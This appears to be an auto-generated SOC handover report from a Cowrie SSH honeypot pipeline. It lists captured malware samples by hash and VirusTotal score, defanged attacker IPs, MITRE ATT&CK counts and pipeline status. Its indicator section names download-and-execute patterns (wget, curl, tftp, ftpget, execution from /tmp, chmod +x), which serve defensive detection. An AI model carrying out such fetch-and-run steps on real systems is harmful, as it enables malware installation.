| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `65.20.138[.]3` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 50 |
| `103.147.248[.]23` | IN | Softcrop It | **100** ⚠️ | 50 |
| `115.160.67[.]73` | KR | Seokyung Cable Television Co.. Ltd. | **100** ⚠️ | 3 |
| `222.92.61[.]242` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |
| `117.158.166[.]73` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `213.66.196[.]11` | SE | Telia Network services | **100** ⚠️ | 50 |
| `181.175.220[.]83` | EC | XTRIM UIO | **100** ⚠️ | 0 |
| `70.89.116[.]5` | US | Comcast Cable Communications, LLC | **100** ⚠️ | 50 |
| `179.181.133[.]153` | BR | TELEFÔNICA BRASIL S.A | **100** ⚠️ | 50 |
| `111.70.23[.]238` | TW | CHT-Mobile business Group,Chunghwa | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 149 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 137 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 60 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 60 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 60 |

---

## 🔕 False Positive Summary (13 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 23 below threshold 25 | 3 |
| AbuseIPDB score 5 below threshold 25 | 4 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 3 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 4758 cases |
| Tool 34  | Credential Extractor        | ✅ 158 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 9 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 81 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 13 filtered (0.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 61 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 21 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 137 priority case(s) shown individually · 24 recon entry/entries in table (9 group(s) consolidating 4593 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-16T12:46:28Z_
